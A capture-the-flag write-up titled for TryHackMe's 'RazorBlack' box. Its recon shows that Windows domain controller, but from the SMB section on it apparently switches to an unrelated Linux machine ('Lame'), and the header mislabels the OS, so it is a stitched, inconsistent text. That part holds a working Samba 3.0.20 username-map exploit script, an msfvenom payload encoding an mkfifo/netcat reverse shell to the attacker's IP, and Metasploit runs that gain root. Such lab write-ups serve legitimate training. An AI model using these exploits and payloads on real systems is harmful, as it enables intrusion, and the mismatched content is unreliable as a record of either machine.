---
title: "THM - # RazorBlack"
classes: wide
tag: 
  - "OSCP Box"
  - "VSFTPD 2.3.4 Exploit"
  - "Linux Box"
  - "Linux VAPT"
  - "Samba 3.0.20"
  - "OSCP Prep"
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # RazorBlack"
categories:
  - THM
---

The given box ```RazorBlack``` is a Linux machine with an IP address of ```10.10.135.22```

- [TryHackMe- RazorBlack](#hack-the-box---lame)
  - [Recon](#recon)
    - [Nmap Scan Result](#nmap-scan-result)
  - [Enumeration](#enumeration)
    - [FTP anonymous login](#ftp-anonymous-login)
    - [SMB enumeration with smbmap](#smb-enumeration-with-smbmap)
    - [SMB enumeration with smbclient](#smb-enumeration-with-smbclient)
  - [Finding Suitable Exploits With Searchsploit](#finding-suitable-exploits-with-searchsploit)
    - [FTP - VSFTPD 2.3.4 exploit](#ftp---vsftpd-234-exploit)
    - [Samba 3.0.20 exploit](#samba-3020-exploit)
  - [Gaining Access](#gaining-access)
    - [VSFTPD 2.3.4 manual exploit](#vsftpd-234-manual-exploit)
    - [VSFTPD 2.3.4 metasploit exploit](#vsftpd-234-metasploit-exploit)
    - [Samba 3.0.20 manual exploit](#samba-3020-manual-exploit)
    - [Samba 3.0.20 metasploit exploit](#samba-3020-metasploit-exploit)

## Recon

### Nmap Scan Result

On performing a nmap scan on the target, we can see there are 32 standard ports open

```c
root@rE3oN:~/thm/machines/medium/raz0rblack# masscan -p1-65535,U:1-65535 --rate=1000 10.10.135.22 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-11 15:34:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 58637/udp on 10.10.135.22
Discovered open port 389/tcp on 10.10.135.22
Discovered open port 49679/tcp on 10.10.135.22
Discovered open port 636/tcp on 10.10.135.22
Discovered open port 135/tcp on 10.10.135.22
Discovered open port 593/tcp on 10.10.135.22
Discovered open port 53/tcp on 10.10.135.22
Discovered open port 49669/tcp on 10.10.135.22
Discovered open port 49856/tcp on 10.10.135.22
Discovered open port 49667/tcp on 10.10.135.22
Discovered open port 49674/tcp on 10.10.135.22
Discovered open port 57300/udp on 10.10.135.22
Discovered open port 9389/tcp on 10.10.135.22
Discovered open port 49676/tcp on 10.10.135.22
Discovered open port 49664/tcp on 10.10.135.22
Discovered open port 2049/tcp on 10.10.135.22
Discovered open port 47001/tcp on 10.10.135.22
Discovered open port 3268/tcp on 10.10.135.22
Discovered open port 49665/tcp on 10.10.135.22
Discovered open port 57651/udp on 10.10.135.22
Discovered open port 5985/tcp on 10.10.135.22
Discovered open port 3389/tcp on 10.10.135.22
Discovered open port 464/tcp on 10.10.135.22
Discovered open port 88/tcp on 10.10.135.22
Discovered open port 49708/tcp on 10.10.135.22
Discovered open port 3269/tcp on 10.10.135.22
Discovered open port 139/tcp on 10.10.135.22
Discovered open port 58941/udp on 10.10.135.22
Discovered open port 111/tcp on 10.10.135.22
Discovered open port 445/tcp on 10.10.135.22
Discovered open port 49675/tcp on 10.10.135.22
Discovered open port 49694/tcp on 10.10.135.22
```

	

And also it discovered that the machine is running ```Windows``` OS

```c
# Nmap 7.92 scan initiated Sat Jul  9 19:57:26 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/_full_tcp_nmap.txt -oX /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/xml/_full_tcp_nmap.xml 10.10.247.120
Increasing send delay for 10.10.247.120 from 0 to 5 due to 611 out of 1527 dropped probes since last increase.
Increasing send delay for 10.10.247.120 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.247.120
Host is up, received user-set (0.18s latency).
Scanned at 2022-07-09 19:57:27 IST for 1142s
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-09 14:41:39Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Issuer: commonName=HAVEN-DC.raz0rblack.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-08T14:26:08
| Not valid after:  2023-01-07T14:26:08
| MD5:   8e38 471c d08c 1570 27b1 20e9 faa4 b519
| SHA-1: 12da c7ca 7abc 435f f6ea 542a 6322 db63 8098 ee98
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIQQKxL8oWvM7hDGk2gbBkKsTANBgkqhkiG9w0BAQsFADAi
| MSAwHgYDVQQDExdIQVZFTi1EQy5yYXowcmJsYWNrLnRobTAeFw0yMjA3MDgxNDI2
| MDhaFw0yMzAxMDcxNDI2MDhaMCIxIDAeBgNVBAMTF0hBVkVOLURDLnJhejByYmxh
| Y2sudGhtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0G39e8XIgDuJ
| xMo4IARZCUyCHEWSvqfKODuuj7pdViGtlGOLb1oPLca0lHc9l07zhh45PnNrv/CC
| ehPWfeAeFADdCb+iXlip0lZqvUlCImUbbpMO/NUL9SVhOqA12uH4J7NJK0GgW2x4
| +8g6VD4zPheZfAUOuQECmLRtATSfGW1UewvscL16ih9m2VUXEjdClyK4sq/Fjh5Q
| MgftbQQyqRA3eyNnm69lsbrCJnJ/sxRLjGifkXfB+uCmkw8ZbvmsXqG9xk1VCyf8
| cLn7h5NhgSW1Yr+Xt9wG74SDW2xadloIVsedPdqtRlB8BVaD9271hLAhZky8WAz4
| qLkK0TwuBQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
| BDAwDQYJKoZIhvcNAQELBQADggEBAECk0mch8qtKekAn+uZTYz+i7sABSy7nek34
| L3RNVvYaSAXK0UBF7EFZmq4Ye0EPs390q2LbEbjji3qSWcQywQ6MK5CDBwgfzfU/
| 1x73ieELRcmWiU1X69xdbJr5CdaBbpb8Bapm8+e7pOjHsLH3Qd0Q2ZW3dBMWQQDI
| BBioVi8nJ1ISt3Coy0sYGPy+eKQcIA0D8Y6JOLkZLPaxDyvqx7hmoSXn/ONPQ4Ti
| hP4h/anme8+uNWO1iWYlDR2OgtQTYN24in1/74Etdj3pZX/Fbp04DCNIVcsCmx/R
| rFKZaKnwIvk+Y9zcolud1gMdD9UNaUrkcxLzJkiOdPqcHLN7Fa8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-07-09T14:44:35+00:00
|_ssl-date: 2022-07-09T14:44:44+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/9%OT=53%CT=1%CU=39653%PV=Y%DS=2%DC=T%G=Y%TM=62C994C5
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=
OS:S%TS=U)OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505N
OS:W8NNS%O6=M505NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
OS:=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=8
OS:0%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43629/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27615/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49191/udp): CLEAN (Failed to receive data)
|   Check 4 (port 47775/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-09T14:44:37
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   172.31 ms 10.11.0.1
2   179.02 ms 10.10.247.120

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  9 20:16:29 2022 -- 1 IP address (1 host up) scanned in 1142.90 seconds

```

## Enumeration

### RPC 

While enumerating port 111 a nfs is been opened, And found a flag ```THM{ab53e05c9a98def00314a14ccbfa8104}```  from sbradley user and one more file is there where all usernames was mentioned.

```c
Export list for 10.10.247.120:
/users (everyone)

root@rE3oN:~/thm/machines/medium/raz0rblack# mount 10.10.135.22:/users /mnt/users

root@rE3oN:~/thm/machines/medium/raz0rblack# ls /mnt/users
employee_status.xlsx  sbradley.txt

root@rE3oN:~/thm/machines/medium/raz0rblack# cat /mnt/users/sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}

```



### SMB enumeration with smbmap

There is a ```SMB``` port open in ```445```, so lets enumerate for ```open shares``` in SMB

```c
 ┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

There is a share named ```tmp``` where we can ```read & write```



### SMB enumeration with smbclient

We got an open share named ```tmp```, lets try to enumerate this share with ```smbclient```

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ smbclient  -N //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

It shows ```protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED```, which means our ```smbclient``` is not ready to lower its protocol inorder to connect with the machine's SMB share

We have to force our smbclient to lower its protocol to connect with ```Samba v1 (SMB1)```

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ smbclient  -N //10.10.10.3/tmp --option="client min protocol = NT1"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 15 11:04:34 2021
  ..                                 DR        0  Sat Oct 31 12:03:58 2020
  .ICE-unix                          DH        0  Wed Sep 15 10:50:26 2021
  vmware-root                        DR        0  Wed Sep 15 10:50:49 2021
  .X11-unix                          DH        0  Wed Sep 15 10:50:51 2021
  .X0-lock                           HR       11  Wed Sep 15 10:50:51 2021
  5562.jsvc_up                        R        0  Wed Sep 15 10:51:29 2021
  vgauthsvclog.txt.0                  R     1600  Wed Sep 15 10:50:24 2021

                7282168 blocks of size 1024. 5386528 blocks available
smb: \> 
```

There is no useful information from SMB shares

## Finding Suitable Exploits With Searchsploit

After enumerating all protocols, we are empty handed

So its better to find an exploit for the protocols with the specific version number of the service

### FTP - VSFTPD 2.3.4 exploit

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ searchsploit vsftpd 2.3.4
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                       | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                          | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

So there is a possible backdoor command execution in FTP protocol

It is also a popular exploit when it comes to ```FTP Exploitation```

### Samba 3.0.20 exploit

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ searchsploit samba | grep 3.0.20
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                           | linux/remote/7701.txt
```

Here we have 2 possible exploits, but we don't want to overflow the SMB

We need a RCE, so we go for ```'Username' map script' Command Execution``` to exploit this version of SMB

## Gaining Access

### VSFTPD 2.3.4 manual exploit

This is a simple exploit that is being triggered with ```:)``` (Not smiley)

For more reference on this [exploit](https://www.exploit-db.com/exploits/49757)

Manual exploit [python script](https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py)

Trying manually without scripts,

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
└─$ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER monish:)
331 Please specify the password.
PASS hackme
500 OOPS: priv_sock_get_result

┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ nc 10.10.10.3 6200                                             
(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
```

No luck

Trying with scripts,

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
└─$ python3 vsftpd.py                                              
Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>
Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami
                                                                      
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
└─$ python3 vsftpd.py 10.10.10.3 21 whoami
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
[!] Failed to connect to backdoor on 10.10.10.3:6200

┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ nc 10.10.10.3 6200                                             
(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
```

After googling, it is mentioned that this exploit will work damn sure if the version number is correct

But the problem in spawning reverse shell connection is due to ```firewall/iptables``` which doesn't let the outbound connection on port ```6200```

### VSFTPD 2.3.4 metasploit exploit

There is already an exploit for this vulnerability in metasploit, lets try to use this one

```c
msf6 > search vsftpd2.3.4
[-] No results from search
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Same bad luck, this exploit was completed but it could not get the reverse shell from inside of the machine

### Samba 3.0.20 manual exploit

From the ```'Username' map script' Command Execution``` exploit, we can clearly see that this exploit is being triggered by ```nohup```

The nohup command executes another program specified as its argument and ignores all SIGHUP (hangup) signals. SIGHUP is a signal that is sent to a process when its controlling terminal is closed

This exploit requires ```no authentication``` on SMB and it uses ```username``` to pass payloads via ```nohup``` in it

The exploit section in ```ruby``` will be like ,

```c
def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
			simple.client.negotiate(false)
			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
			# nothing, it either worked or it didn't ;)
		end

		handler
	end
```

Searching for a short and sweet exploit, I found [this](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851) 

The manual exploit for Samba 3.0.20 will be like,

```c
#!/usr/bin/python

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys


# Just a python version of a very simple Samba exploit. 
# It doesn't have to be pretty because the shellcode is executed
# in the username field. 

# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/ 

# Configured SMB connection options with info from here:
# https://pythonhosted.org/pysmb/api/smb_SMBConnection.html

# Use the commandline argument as the target: 
if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()


# Shellcode: 
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python

buf =  ""
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"
buf += "FILL PAYLOAD HERE"


username = "/=`nohup " + buf + "`"
password = ""
conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
assert conn.connect(sys.argv[1], 445)
```

We have to generate our ```shellcode``` using ```msfvenom``` which will be our payload in the exploit script to trigger a reverse shell

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.8 LPORT=6789 -f python
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 88 bytes
Final size of python file: 440 bytes
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6c"
buf += b"\x63\x6f\x69\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31\x30"
buf += b"\x2e\x31\x34\x2e\x38\x20\x36\x37\x38\x39\x20\x30\x3c"
buf += b"\x2f\x74\x6d\x70\x2f\x6c\x63\x6f\x69\x20\x7c\x20\x2f"
buf += b"\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f"
buf += b"\x6c\x63\x6f\x69\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d"
buf += b"\x20\x2f\x74\x6d\x70\x2f\x6c\x63\x6f\x69"
```

Copy this shellcode in the exploit script and start running it with ```netcat``` listener to get the ```reverse shell```

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
└─$ python samba.py 10.10.10.3                                                           

┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ nc -nlvp 6789                                                  1 ⨯
listening on [any] 6789 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 54632
id
uid=0(root) gid=0(root)
whoami
root
ls /home/
ftp
makis
service
user
cat /home/makis/user.txt
<---USER FLAG--->
cat /root/root.txt
<---ROOT FLAG--->
```

### Samba 3.0.20 metasploit exploit

Lets use the metasploit exploit for Samba 3.0.20 by simply configuring the remote and listener

```c
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options 

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.88     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.8
LHOST => 10.10.14.8
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Command shell session 1 opened (10.10.14.8:4444 -> 10.10.10.3:58270) at 2021-09-15 12:03:55 +0530

id
uid=0(root) gid=0(root)
whoami
root
cat /home/makis/user.txt
<---USER FLAG--->
cat /root/root.txt
<---ROOT FLAG--->
```

It is way more simple than using manual exploit, because frameworks are always meant to automate our work